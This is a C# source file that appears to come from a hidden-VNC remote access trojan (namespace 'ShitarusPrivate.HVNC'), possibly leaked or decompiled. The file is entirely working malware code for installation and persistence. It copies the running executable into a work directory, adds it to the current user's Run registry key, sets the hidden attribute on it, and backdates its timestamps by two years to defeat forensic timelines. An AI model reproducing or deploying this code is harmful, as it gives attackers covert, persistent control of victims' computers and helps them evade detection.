using System;
using System.IO;
using Microsoft.Win32;

namespace ShitarusPrivate.HVNC.Helpers
{
    internal sealed class Startup
    {
        public static readonly string ExecutablePath = AppDomain.CurrentDomain.BaseDirectory;

        private static readonly string InstallDirectory = Paths.InitWorkDir();

        private static readonly string InstallFile = Path.Combine(InstallDirectory, new FileInfo(ExecutablePath).Name);

        private static readonly string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

        private static readonly string StartupName = Path.GetFileNameWithoutExtension(ExecutablePath);

        public static void SetFileCreationDate(string path = null)
        {
            string path2 = path;
            if (path == null)
            {
                path2 = ExecutablePath;
            }
            Logging.Log();
            DateTime dateTime = new DateTime(DateTime.Now.Year - 2, 5, 22, 3, 16, 28);
            File.SetCreationTime(path2, dateTime);
            File.SetLastWriteTime(path2, dateTime);
            File.SetLastAccessTime(path2, dateTime);
        }

        public static void HideFile(string path = null)
        {
            string fileName = path;
            if (path == null)
            {
                fileName = ExecutablePath;
            }
            Logging.Log();
            new FileInfo(fileName).Attributes |= FileAttributes.Hidden;
        }

        public static bool IsInstalled()
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(StartupKey, writable: false);
            if (registryKey != null && registryKey.GetValue(StartupName) != null)
            {
                return File.Exists(InstallFile);
            }
            return false;
        }

        public static void Install()
        {
            Logging.Log();
            if (!File.Exists(InstallFile))
            {
                File.Copy(ExecutablePath, InstallFile);
            }
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(StartupKey, writable: true);
            if (registryKey != null && registryKey.GetValue(StartupName) == null)
            {
                registryKey.SetValue(StartupName, InstallFile);
            }
            string[] array = new string[1] { InstallFile };
            foreach (string text in array)
            {
                if (File.Exists(text))
                {
                    HideFile(text);
                    SetFileCreationDate(text);
                }
            }
        }

        public static bool IsFromStartup()
        {
            return ExecutablePath.StartsWith(InstallDirectory);
        }
    }
}
